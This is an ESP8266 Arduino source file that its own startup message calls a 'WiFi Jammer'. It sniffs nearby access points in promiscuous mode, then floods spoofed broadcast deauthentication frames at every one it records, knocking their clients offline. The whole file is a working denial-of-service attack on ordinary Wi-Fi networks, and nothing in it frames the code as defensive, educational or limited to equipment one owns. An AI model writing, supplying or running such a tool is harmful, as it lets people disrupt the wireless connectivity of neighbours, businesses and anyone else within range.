#ifdef ESP8266

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

#define MAX_APS 100
#define CHANNELS 14

struct AP {
  uint8_t bssid[6];
  int channel;
};

AP aps[MAX_APS];
int apCount = 0;

int currentChannel = 1;

unsigned long lastSwitch = 0;
unsigned long switchInterval = 100; // ms channel switch time

// Deauth packet template
uint8_t deauthPacket[26] = {
  0xc0, 0x00,
  0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

void ICACHE_RAM_ATTR sniffer_callback(uint8_t *buf, uint16_t len) {
  if (len < 36) return; // minimal length for 802.11 packet
  
  // The BSSID is at bytes 16 to 21 in beacon/auth frame
  uint8_t *bssid = buf + 16;
  
  // Check if AP already recorded
  for (int i = 0; i < apCount; i++) {
    if (memcmp(aps[i].bssid, bssid, 6) == 0) {
      return;
    }
  }
  
  // Add new AP if space
  if (apCount < MAX_APS) {
    memcpy(aps[apCount].bssid, bssid, 6);
    aps[apCount].channel = currentChannel;
    apCount++;
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);
  Serial.println("Starting WiFi Jammer...");
}

void loop() {
  unsigned long now = millis();

  if (now - lastSwitch > switchInterval) {
    currentChannel++;
    if (currentChannel > CHANNELS)
      currentChannel = 1;

    wifi_set_channel(currentChannel);
    lastSwitch = now;
  }

  for (int i = 0; i < apCount; i++) {
    wifi_set_channel(aps[i].channel);
    memcpy(&deauthPacket[10], aps[i].bssid, 6);
    memcpy(&deauthPacket[16], aps[i].bssid, 6);
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(1);
  }
}

#endif
